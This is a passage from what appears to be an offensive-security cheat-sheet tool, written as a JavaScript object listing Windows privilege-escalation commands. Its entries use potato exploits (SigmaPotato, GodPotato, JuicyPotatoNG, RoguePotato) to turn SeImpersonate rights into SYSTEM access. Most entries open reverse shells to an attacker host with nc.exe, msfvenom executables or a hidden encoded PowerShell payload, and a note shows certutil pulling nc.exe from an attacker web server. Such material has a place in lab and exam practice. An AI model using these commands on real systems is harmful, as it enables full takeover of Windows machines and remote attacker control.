    ...
    winpriv: {
      name: "Win Privesc", groups: [
        ...
        { phase: "SeImpersonate → SYSTEM (potatoes)", cmds: [
          { label: "SigmaPotato → nc.exe shell (SMB pull)", cmd: `.\\SigmaPotato.exe "C:\\Windows\\Temp\\nc.exe -e cmd.exe ${LHOST} ${LPORT}"`, note: "Pull nc.exe first: certutil -urlcache -f http://${LHOST}:${SRVPORT}/nc.exe C:\\Windows\\Temp\\nc.exe" },
          { label: "SigmaPotato → nc.exe off SMB share (no disk write)", cmd: `.\\SigmaPotato.exe "//  ${LHOST}/Share/nc.exe -e cmd.exe ${LHOST} ${LPORT}"`, note: "Run impacket-smbserver Share ~/share -smb2support on Kali. Binary runs straight off the share." },
          { label: "SigmaPotato → reverse shell exe", cmd: `.\\SigmaPotato.exe "C:\\Windows\\Temp\\${FN}"`, note: "Drop a msfvenom .exe to C:\\Windows\\Temp first, then point SigmaPotato at it." },
          { label: "SigmaPotato → PowerShell reverse shell", cmd: `.\\SigmaPotato.exe "powershell -nop -w hidden -e ${Q}JABjAGwAaQBlAG4AdAAg...BASE64...${Q}"`, note: "Generate with encode.py: python3 encode.py (utf-16 base64 PS payload). Use full PS reverse shell string." },
          { label: "SigmaPotato → whoami (verify SYSTEM)", cmd: `.\\SigmaPotato.exe "whoami"`, note: "Run this first to confirm it's working before firing the real payload." },
          ...
          { label: "GodPotato → nc.exe reverse shell", cmd: `.\\GodPotato-NET4.exe -cmd "cmd /c C:\\Windows\\Temp\\nc.exe -e cmd.exe ${LHOST} ${LPORT}"` },
          { label: "GodPotato → reverse shell exe", cmd: `.\\GodPotato-NET4.exe -cmd "cmd /c C:\\Windows\\Temp\\${FN}"` },
          { label: "JuicyPotatoNG", cmd: `.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\Temp\\${FN}"` },
          { label: "RoguePotato (older)", cmd: `.\\RoguePotato.exe -r ${LHOST} -e "C:\\Windows\\Temp\\${FN}" -l 9999` },
        ]},
